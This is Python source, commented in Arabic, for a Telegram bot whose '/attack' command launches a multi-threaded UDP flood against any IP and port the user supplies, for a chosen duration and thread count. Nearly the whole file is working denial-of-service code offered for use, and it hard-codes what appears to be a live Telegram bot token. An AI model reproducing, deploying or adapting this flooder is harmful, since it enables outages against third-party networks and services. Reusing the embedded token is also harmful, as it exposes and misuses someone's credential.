import socket
import time
import threading
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# التوكن الخاص ببوتك (استبدله بتوكن بوتك الحقيقي من BotFather)
TOKEN = "8980281589:AAEqY4nk6POnwVwNJ85tZ4GKhh8j7fGbUgw"

# الـ Payload العشوائي المطابق للسكربت الأصلي
PAYLOAD = "!@_n15=-1n1,,5<%@!%.>{424}_;}{[42424242]-[424JIROINj521n9558n15N%1n019505%)(@!%N!%%!()%!^)@!*!^)!N^n66n1l.6[pn1[6pn^NO^1-6-1n61-n6161=-6[1NO^Pn1i60n9i1n69016n16n16nop12k6np1on6k1p<>A<?>W<N,./awn,525n1;5".encode('utf-8')

def run_flooder(target_ip, target_port, attack_time, bots_count):
    stop_event = threading.Event()

    def flooder_worker():
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not stop_event.is_set():
            try:
                client.sendto(PAYLOAD, (target_ip, target_port))
            except Exception:
                pass
            time.sleep(0.1) # تأخير 100 ميلي ثانية مطابق للسكربت الأصلي

    threads = []
    for _ in range(bots_count):
        t = threading.Thread(target=flooder_worker)
        t.daemon = True
        threads.append(t)
        t.start()

    # الانتظار حتى ينتهي الوقت المحدد ثم ايقاف الخيوط
    time.sleep(attack_time)
    stop_event.set()

# دالة التعامل مع أمر البوت /attack
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    
    # التحقق من المدخلات (مطابق لمنطق السكربت الأصلي)
    if len(args) < 4:
        await update.message.reply_text(
            "❌ استخدام خاطئ!\n"
            "الصيغة الصحيحة:\n"
            "`/attack <ip> <port> <time> <bots>`\n"
            "مثال:\n"
            "`/attack 192.168.0.1 80 5 10`",
            parse_mode="Markdown"
        )
        return

    target_ip = args[0]
    
    try:
        target_port = int(args[1])
        attack_time = int(args[2])
        bots_count = int(args[3])
    except ValueError:
        await update.message.reply_text("❌ خطأ: يجب أن يكون البورت والوقت وعدد البوتات أرقاماً صحيحة (Integers).")
        return

    # تنبيه بانطلاق العملية
    await update.message.reply_text(f"🔵 [INFO] Flooding started to {target_ip}:{target_port} for {attack_time}s...")

    # تشغيل الهجوم في خلفية منفصلة لكي لا يتجمد بوت التيليجرام
    threading.Thread(target=run_flooder, args=(target_ip, target_port, attack_time, bots_count)).start()

    # جدولة رسالة الانتهاء بعد انتهاء الوقت
    # (يمكن استخدام asyncio أو الانتظار البسيط بحسب الرغبة، هنا سنكتفي برسالة فورية بالبدء)

def main():
    # بناء تطبيق البوت
    app = ApplicationBuilder().token(TOKEN).build()

    # ربط الأمر /attack بالدالة
    app.add_handler(CommandHandler("attack", attack_command))

    print("[INFO] Telegram Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
